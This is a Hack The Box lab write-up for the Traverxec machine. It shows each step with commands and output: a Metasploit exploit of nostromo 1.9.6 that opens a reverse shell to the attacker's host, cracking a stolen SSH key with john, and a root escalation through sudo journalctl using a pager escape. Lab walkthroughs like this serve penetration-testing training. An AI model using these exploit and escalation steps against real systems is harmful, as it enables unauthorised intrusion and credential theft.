---
date: 2020-04-23
title: "Hack The Box ~ Traverxec"
published: true
---
<br>
<center>
<img src='assets/traverxec/traverxec.jpg'>
</center>

Today we will be doing Traverxec from Hack the Box. The box was rated easy and good for beginners to practice pentesting skills. The box had an IP address of 10.10.10.165. For the initial foothold we had to exploit a webserver that was vulnerable to remote code execution and get a reverse shell back in our machine. For root the user David had privilege to execute journalctl as root we leveraged that to get root in the box. With that said let’s jump in.<br><br>

We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing
for vulnerabilities.

```
m1m3@kali:~/Documents/htb/traverxec$ nmap -sC -sV -oA nmap/traverxec 10.10.10.165
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-25 04:02 IST
Nmap scan report for 10.10.10.165
Host is up (0.27s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.14 seconds
```

We see that the port 80 is open an it is running `nostromo 1.9.6`. Looking at the port 80, we have a static website with nothing useful.

<br><br>

## Initial Foothold:
Now lets look on searchsploit if we have a vulnerable version of nostromo

```
m1m3@kali:~/Documents/htb/traverxec$ searchsploit nostromo
--------------------------------------------------------- ----------------------------------------
 Exploit Title                                           |  Path
                                                         | (/usr/share/exploitdb/)
--------------------------------------------------------- ----------------------------------------
Nostromo - Directory Traversal Remote Command Execution  | exploits/multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                   | exploits/multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Comma | exploits/linux/remote/35466.sh
--------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

We have RCE available. Lets use the metasploit for it.

```
msf5 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution


msf5 > use exploit/multi/http/nostromo_code_exec 
msf5 exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
RHOSTS => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.115:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.14.115:4444 -> 10.10.10.165:49476) at 2020-03-25 04:18:35 +0530
```


We get a TCP reverse shell which we can turn into a pty shell using:

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

If we type `id` we get the user of the shell:

```
www-data@traverxec:/usr/bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
<br><br>

## User Shell:

With some enumeration we can find the nostromo config file at `/var/nostromo/conf` which reveals a http password file
for protecting the www directory from david’s home.

```
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf

# HOMEDIRS [OPTIONAL]

homedirs          /home
homedirs_public   public_www
```

Based on the config file, I am guessing that david is going to have a sub directory named public_www, so let’s see if we can get a directory listing of /home/david/public_www

```
www-data​ @traverxec​ :/var/nostromo/htdocs​ $ ​ ls /home/david/public_www -lah
ls /home/david/public_www -lah
total ​ 16​ K
drwxr-xr-x ​ 3 ​ david david ​ 4.0​ K Oct ​ 25​ ​ 15​ : ​ 45​ .
drwx--x--x ​ 5 ​ david david ​ 4.0​ K Oct ​ 25​ ​ 17​ : ​ 02​ ..
-rw-r--r-- ​ 1 ​ david david ​ 402​   Oct ​ 25​ ​ 15​ : ​ 45​ index.html
drwxr-xr-x ​ 2 ​ david david ​ 4.0​ K Oct ​ 25​ ​ 17​ : ​ 02​ protected-file-area
```

After looking inside the `protected-file-area` we a get a file `backup-ssh-identity-files.tgz`. After copying it to my machine, I found the private ssh key for David. We can now use john to crack the key and ssh into the box.

```
m1m3@kali:~/Documents/htb/traverxec$ /usr/share/john/ssh2john.py id_rsa > id_rsa.txt
m1m3@kali:~/Documents/htb/traverxec$ john id_rsa.txt

Press 'q' ​ or​ Ctrl-C ​ to​ abort, almost any other key for status
hunter      (david)
Session completed
```

Hurray! We found the key for David. Now lets ssh into the box and grab the user flag.

```
m1m3@kali:~/Documents/htb/traverxec$ ssh -i id_rsa david@10.10.10.165
Enter passphrase for key 'id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64

david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david)

david@traverxec:~$ wc -c user.txt
33 user.txt
```
<br><br>

## Root Shell:

The first thing I noticed when I got the user when doing privilege escalation is there is a bin directory inside David’s home directory it has a file called server-stats.sh. 

```
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Last line of the script tells us that david can run `/usr/bin/journalctl` with sudo. So I went to [GTFO bin’s](https://gtfobins.github.io/gtfobins/journalctl/) and exploited the less prompt that opens up as sudo using this `!/bin/bash`.

```
david@traverxec:/dev/shm$ ./server-stats.sh
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# wc -c /root/root.txt
33 root.txt
```

That’s it! Thanks for reading! Make sure to stay tuned for more upcoming Hack The Box writeups!